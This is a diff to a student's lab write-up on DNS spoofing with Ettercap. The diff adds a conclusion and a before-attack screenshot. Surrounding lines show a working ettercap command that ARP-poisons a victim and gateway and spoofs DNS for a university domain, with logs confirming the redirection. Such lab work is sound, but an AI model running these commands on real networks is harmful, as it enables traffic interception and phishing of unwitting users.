@@ -151,7 +151,12 @@ pmics.cse.du.ac.bd     A   192.168.219.134
 
 <img width="644" alt="Screenshot 2025-05-28 at 12 56 44 PM" src="https://github.com/user-attachments/assets/b8fa5237-1e30-4def-8632-e3d1de61353f" />
 
+Before the attack, when victim browses ```pmics.cse.du.ac.bd```:
+
+<img width="1423" alt="Screenshot 2025-05-28 at 1 10 31 PM" src="https://github.com/user-attachments/assets/d536904c-36d8-4170-8cd9-1d0279bfe837" />
+
 ## 🧪 Step 3: Launch Ettercap
+
 Run this in terminal:
 ```bash
 sudo ettercap -T -q -M arp:remote /192.168.219.135// /192.168.219.2// -P dns_spoof
@@ -196,6 +201,7 @@ Apache serves the fake site with a big, bold message:
 
 
 Victim's terminal confirms DNS redirection:
+
 ```bash
 ping pmics.cse.du.ac.bd
 PING pmics.cse.du.ac.bd (192.168.219.134) 56(84) bytes of data.
@@ -213,3 +219,18 @@ dns_spoof: A [pmics.cse.du.ac.bd] spoofed to [192.168.219.134] TTL [3600 s]
 
 <img width="637" alt="Screenshot 2025-05-28 at 1 04 50 PM" src="https://github.com/user-attachments/assets/bf8f1dcd-557b-405c-a41b-cbc265ee129c" />
 
+---
+
+##  Conclusion
+This lab shows how DNS spoofing using Ettercap can mislead a user into trusting a fake site. Although executed in a safe environment, it reflects how critical it is to secure DNS communications.
+
+```"If you control DNS, you control the user's world."```
+
+---
+
+# 🎓 Author 
+```MOHTASHIM HAIDER```
+
+```BATCH-4, CYBERSECURITY```
+
+```UNIVERSITY OF DHAKA```
